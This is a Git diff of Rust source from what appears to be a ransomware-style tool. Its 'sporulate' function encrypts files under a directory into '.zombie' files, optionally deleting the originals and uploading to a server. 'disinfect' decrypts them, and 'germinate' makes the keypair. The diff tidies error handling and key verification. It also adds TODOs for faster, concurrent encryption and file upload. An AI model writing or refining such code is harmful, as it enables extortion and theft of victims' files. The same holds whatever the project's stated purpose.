@@ -4,7 +4,7 @@
 use std::{
     collections::HashSet,
     fs::{self, File},
-    io::{self, ErrorKind, Write},
+    io::Write,
     path::Path,
 };
 
@@ -72,6 +72,12 @@ const EXCLUDED_FILES: &[&str] = &[
 ///
 /// # Returns
 /// Returns a unit type if finished with success or an AppError if it fails.
+///
+/// # TODO
+/// 1. Add streaming for file I/O to avoid loading the entire file into memory.
+/// 2. Waiting for a file upload before start the next encryption is a
+///    bottleneck. I could leverage `tokio` to upload files concurrently.
+/// 3. I could add parallelism/concurrency to encrypt files.
 #[tokio::main]
 pub async fn sporulate(
     path: &Path,
@@ -79,22 +85,8 @@ pub async fn sporulate(
     no_delete: &bool,
     server: &Option<String>,
 ) -> Result<(), AppError> {
-    if !path.exists() {
-        return Err(AppError::Io(io::Error::new(
-            ErrorKind::NotFound,
-            format!("Path not found: {:?}", path),
-        )));
-    }
-
-    if !key.is_file() {
-        return Err(AppError::Io(io::Error::new(
-            ErrorKind::NotFound,
-            format!("Key not found: {:?}", key),
-        )));
-    }
-
     let public_key = load_public_key(key)?;
-    debug!("Loaded private key from {:?}", key);
+    debug!("Loaded public key from {:?}", key);
 
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
@@ -172,31 +164,20 @@ pub async fn sporulate(
 }
 
 /// Traverses a directory tree starting from `path`, looking for `.zombie`
-/// files to decrypt them. Disinfects a sporulated file.
+/// files to decrypt them. Iterates through the file system, finds `.zombie`
+/// files, and calls the decryption routine for each one.
 ///
 /// # Arguments
 /// - `path`: The starting directory.
 /// - `key`: Path to the main private key for decryption.
 /// - `no_delete`: If true, the `.zombie` file is not deleted after decryption.
 ///
-/// # Logic
-/// Iterates through the file system, finds `.zombie` files, and calls the
-/// decryption routine for each one.
+/// # Returns
+/// Returns a unity type for success or an AppError on the contrary.
+///
+/// # TODO
+/// 1. Implement concurrency/parallelism to decrypt files faster.
 pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
-    if !path.exists() {
-        return Err(AppError::Io(io::Error::new(
-            ErrorKind::NotFound,
-            format!("Path not found: {:?}", path),
-        )));
-    }
-
-    if !key.is_file() {
-        return Err(AppError::Io(io::Error::new(
-            ErrorKind::NotFound,
-            format!("Key not found: {:?}", key),
-        )));
-    }
-
     let private_key = load_private_key(key)?;
     debug!("Loaded main private key from {:?}", key);
 
@@ -244,13 +225,6 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
 /// # Returns
 /// A `Result` with a unit type on success of an AppError if the routine fails.
 pub fn germinate(path: &Path) -> Result<(), AppError> {
-    if !path.exists() || !path.is_dir() {
-        return Err(AppError::Io(io::Error::new(
-            io::ErrorKind::NotFound,
-            format!("Path not found or not a directory: {:?}", path),
-        )));
-    }
-
     let (private_key_bytes, public_key_bytes) = generate_keypair()?;
 
     let private_key_b64 = b64_encode(&private_key_bytes);
@@ -267,12 +241,17 @@ pub fn germinate(path: &Path) -> Result<(), AppError> {
     file.write_all(public_key_b64.as_ref())?;
     info!("Main public key saved to: {:?}", public_key_path);
 
-    // Verify that the encoded keys can be decoded correctly
-    if let Ok(prikey) = b64_decode(&private_key_b64) {
-        assert_eq!(private_key_bytes, prikey);
+    // Verify that the encoded keys can be decoded correctly. This is a
+    // sanity check to ensure the base64 encoding/decoding roundtrip works
+    // as expected.
+    let decoded_prikey = b64_decode(&private_key_b64)?;
+    if decoded_prikey != private_key_bytes {
+        return Err(AppError::Crypto(crate::error::CryptoError::KeyVerification));
     }
-    if let Ok(pubkey) = b64_decode(&public_key_b64) {
-        assert_eq!(public_key_bytes, pubkey);
+
+    let decoded_pubkey = b64_decode(&public_key_b64)?;
+    if decoded_pubkey != public_key_bytes {
+        return Err(AppError::Crypto(crate::error::CryptoError::KeyVerification));
     }
 
     Ok(())
